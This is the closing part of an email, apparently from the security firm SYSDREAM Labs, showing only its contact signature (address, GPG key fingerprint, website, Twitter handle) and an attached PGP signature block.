SYSDREAM Labs <labs@sysdream.com>

GPG :
47D1 E124 C43E F992 2A2E
1551 8EB4 8CD9 D5B2 59A1

* Website: https://sysdream.com/
* Twitter: @sysdream


--oIbcGEmVxLTIHdqXvpeNMOUwUKrERQM6e
Content-Type: application/pgp-signature; name="signature.asc"
Content-Description: OpenPGP digital signature
Content-Disposition: attachment; filename="signature.asc"

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2

iQIcBAEBCAAGBQJXe8JsAAoJEI60jNnVslmhduAQAKX/X77L5lY+sRRQkk7kKCft
lR6NpE3RTkK3rFAZsJH2GlIFj/npfpiBEe9PQgwje//YAabRDrxygHmjnjzx2nyL
o50eC7pxAhRiTMBtNN3wYyXHhm3Nj/AG42aSMMhFdm3h/ToPqmZXG87Ok2/EPc1W
+ZU/bb0OeWkAcBfkQ8HqJl669XTI18uaTXWtmkzNq2m8CpwyRzd11ldezdSDUVUW
yeOkeKFFzBTOxlxGE+LoVmc5BDZXAZQlTJM+tR4T2OwLrUvYNwGGfydpf7BBb82c
eFHfEQkOI9Q7T3yVpSIobKgyxhOl6zasHImjz/PlF/W5ywN99jtkmlGbAxkddMi2
lXKN3MFhl+lxbyPILUwFm1K70/ez4X34iCWc90ExxlhdNTw86t4b5uVjQYPPyRdr
AqB7uM8dVMyT4AeTNeQuKexqtz28cCwLhReVJ6gEZLbsl0V3s6srociCUtkFH29m
gWCkP4/aASAmuHQh7FZdN/q8FL9L4AdMNpZuGytqYCBKERGczcROf1hXsv6yAUTa
Gre2Awlb0wmJXg6jn9A0tHdyEJJnFYuw6dNyl2MewtV4JT+oDcv10RzwXWn1Gxaa
/VweGVfQQKW5eWz+eTvJYxlYAohOaiWDGLP+DxWcBtj4szWOjWdtNM4dtUjxKvMU
eezkehBLlxFEiKgNeFNy
=KfsD
-----END PGP SIGNATURE-----

--oIbcGEmVxLTIHdqXvpeNMOUwUKrERQM6e--
